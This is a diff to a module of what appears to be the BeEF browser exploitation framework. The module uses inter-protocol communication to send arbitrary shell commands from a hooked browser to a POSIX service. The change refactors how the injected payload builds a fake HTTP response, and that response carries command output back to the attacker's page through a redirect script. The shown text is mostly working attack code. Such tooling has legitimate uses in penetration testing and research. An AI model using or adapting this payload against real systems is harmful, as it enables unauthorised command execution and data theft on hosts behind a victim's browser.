@@ -42,15 +42,18 @@ beef.execute(function() {
 		myform.setAttribute("action",action);
 		document.getElementById("ipc_posix_window_<%= @command_id %>").contentWindow.document.body.appendChild(myform); 
 
+		body1="<html><body><div id='ipc_content'>";
+        body2="__END_OF_POSIX_IPC<%= @command_id %>__</div><s"+"cript>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\\\"ipc_content\\\").innerHTML);</"+"script></body></html>";
+
 		// post results separator
 		myExt = document.createElement("INPUT");
 		myExt.setAttribute("id",<%= @command_id %>);
 		myExt.setAttribute("name",<%= @command_id %>);
-		myExt.setAttribute("value","echo -e HTTP/1.1 200 OK\\\\r;echo -e Content-Type: text/html\\\\r;echo -e Content-Length: "+(34+cmd.length+52+parent.length+110+size*1)+"\\\\r;echo -e Keep-Alive: timeout=5,max=100\\\\r;echo -e Connection: keep-alive\\\\r;echo -e \\\\r;echo \"<html><body><div id='ipc_content'>\";(" + cmd + ")|head -c "+size+" ; "); // TODO Calculate Content-Length without hardcoded sizes
+		myExt.setAttribute("value","echo -e HTTP/1.1 200 OK\\\\r;echo -e Content-Type: text/html\\\\r;echo -e Content-Length: "+(body1.length+cmd.length+body2.length+size*1)+"\\\\r;echo -e Keep-Alive: timeout=5,max=100\\\\r;echo -e Connection: keep-alive\\\\r;echo -e \\\\r;echo \""+body1+"\";(" + cmd + ")|head -c "+size+" ; ");
 		myform.appendChild(myExt);
 
         // Adding puffer space for the command result
-		end_talkback=" echo -e \"__END_OF_POSIX_IPC<%= @command_id %>__</div><s"+"cript>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\\\"ipc_content\\\").innerHTML);</"+"script></body></html>";
+		end_talkback=" echo -e \""+body2;
         while(--size) end_talkback+=" ";
         end_talkback+="\" \\\\r ;";
 
